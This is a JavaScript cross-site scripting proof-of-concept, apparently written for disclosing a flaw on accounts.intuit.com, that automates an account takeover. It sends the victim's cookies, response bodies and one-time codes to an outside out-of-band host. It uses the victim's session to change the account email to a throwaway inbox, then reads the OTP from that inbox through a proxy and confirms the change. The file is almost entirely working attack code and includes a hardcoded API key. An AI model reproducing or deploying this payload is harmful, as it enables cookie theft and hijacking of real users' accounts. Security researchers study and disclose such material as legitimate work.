(function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var P='https://api.allorigins.win/raw?url=';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)
})
}
function proxiedGet(url){
return fetch(P+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
}).then(function(t){return JSON.parse(t)})
}

(new Image).src=O+'/p11-start?c='+encodeURIComponent(document.cookie.substring(0,2000));

var session=gc('ius_session');
var visitorId=gc('ivid');
var flowId=uid();

var iH={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

var logs=[];
function log(m){logs.push(m);var el=document.getElementById('lp');if(el)el.textContent=logs.join('\n')}

document.body.innerHTML='<div style="font:13px monospace;background:#0a0a0a;color:#0f0;padding:25px;min-height:100vh">'
+'<div style="background:#1a0000;border:2px solid #f00;padding:15px;margin-bottom:15px;border-radius:8px">'
+'<h1 style="color:#f00;margin:0 0 5px;font-size:18px">XSS PoC — Automated Email Takeover</h1>'
+'<p style="color:#f88;margin:0;font-size:12px">accounts.intuit.com | returnUrl javascript: URI</p></div>'
+'<div id="steps" style="margin-bottom:15px"></div>'
+'<div style="background:#111;border:1px solid #333;padding:10px;border-radius:8px;max-height:250px;overflow-y:auto">'
+'<pre id="lp" style="color:#888;margin:0;font-size:11px"></pre></div></div>';

var stepsEl=document.getElementById('steps');
function step(n,title,status,color){
var id='s'+n;
var el=document.getElementById(id);
var html='<span style="color:'+(color||'#ff0')+'">'+status+'</span> '+title;
if(el){el.innerHTML=html}
else{stepsEl.innerHTML+='<div id="'+id+'" style="background:#111;border:1px solid #333;padding:8px 12px;margin-bottom:5px;border-radius:5px">'+html+'</div>'}
}

log('session: '+session);
log('flowId: '+flowId);

var login='xpoc'+Math.random().toString(36).substr(2,8);
var domain='esiix.com';
var email=login+'@'+domain;

step(1,'Temp email: '+email,'[READY]','#0f0');
step(2,'Initialize email change','[...]','#ff0');
step(3,'Poll for OTP','[waiting]','#666');
step(4,'Verify & complete','[waiting]','#666');

log('attacker email: '+email);
log('');
log('--- Step 2: Initialize ---');

(new Image).src=O+'/p11-email?addr='+encodeURIComponent(email);

fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:iH,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email}),
credentials:'include'
})
.then(function(r){
log('init status: '+r.status);
return r.text()
})
.then(function(body){
log('init resp: '+body);
(new Image).src=O+'/p11-init?r='+encodeURIComponent(body.substring(0,800));
var data;try{data=JSON.parse(body)}catch(e){}
if(!data||!data.verifierSessionId)throw new Error('init failed: '+body.substring(0,200));

var vsid=data.verifierSessionId;
log('verifierSessionId: '+vsid);
step(2,'Initialize: OTP sent to '+email,'[OK]','#0f0');
step(3,'Polling inbox for OTP...','[...]','#ff0');

log('');
log('--- Step 3: Poll for OTP ---');

var attempt=0;
var maxAttempts=50;

function poll(){
attempt++;
log('poll #'+attempt);
var url='https://www.1secmail.com/api/v1/?action=getMessages&login='+login+'&domain='+domain;
return proxiedGet(url).then(function(msgs){
log('messages: '+msgs.length);
if(msgs.length>0){
log('got email! id='+msgs[0].id+' subject='+msgs[0].subject);
step(3,'OTP email received!','[OK]','#0f0');
var readUrl='https://www.1secmail.com/api/v1/?action=readMessage&login='+login+'&domain='+domain+'&id='+msgs[0].id;
return proxiedGet(readUrl)
}
if(attempt>=maxAttempts)throw new Error('timeout after '+maxAttempts+' polls');
return new Promise(function(resolve){
setTimeout(function(){resolve(poll())},3000)
})
})
}

return poll().then(function(msg){
var body2=msg.textBody||msg.body||msg.htmlBody||'';
log('email body: '+body2.substring(0,300));
(new Image).src=O+'/p11-mail?b='+encodeURIComponent(body2.substring(0,500));

var otp=null;
var m6=body2.match(/\b(\d{6})\b/);
if(m6){otp=m6[1]}
else{
var m4=body2.match(/\b(\d{4,8})\b/);
if(m4)otp=m4[1]
}
if(!otp)throw new Error('no OTP found in email');

log('OTP: '+otp);
(new Image).src=O+'/p11-otp?otp='+otp;
step(3,'OTP extracted: '+otp,'[OK]','#0f0');
return{vsid:vsid,otp:otp}
})
})
.then(function(ctx){
step(4,'Verifying OTP...','[...]','#ff0');
log('');
log('--- Step 4: Verify ---');

return fetch('/factors/v1/verifier/verify/email',{
method:'POST',
headers:iH,
body:JSON.stringify({verifierSessionId:ctx.vsid,otp:ctx.otp}),
credentials:'include'
}).then(function(r){
log('verify status: '+r.status);
return r.text()
}).then(function(body3){
log('verify resp: '+body3);
(new Image).src=O+'/p11-done?r='+encodeURIComponent(body3.substring(0,800));
step(4,'Email changed to '+email,'[DONE]','#0f0');
stepsEl.innerHTML+='<div style="background:#001a00;border:2px solid #0f0;padding:15px;margin-top:10px;border-radius:8px;text-align:center">'
+'<h2 style="color:#0f0;margin:0">ACCOUNT TAKEOVER VIA XSS</h2>'
+'<p style="color:#ff0;margin:5px 0 0">Email silently changed to attacker-controlled address</p></div>';
})
})
.catch(function(err){
log('ERROR: '+err.message);
(new Image).src=O+'/p11-fail?e='+encodeURIComponent(err.message);
var failStep=2;
if(err.message.indexOf('proxy')!==-1||err.message.indexOf('timeout')!==-1)failStep=3;
step(failStep,'Error: '+err.message,'[FAIL]','#f00');
});
})();
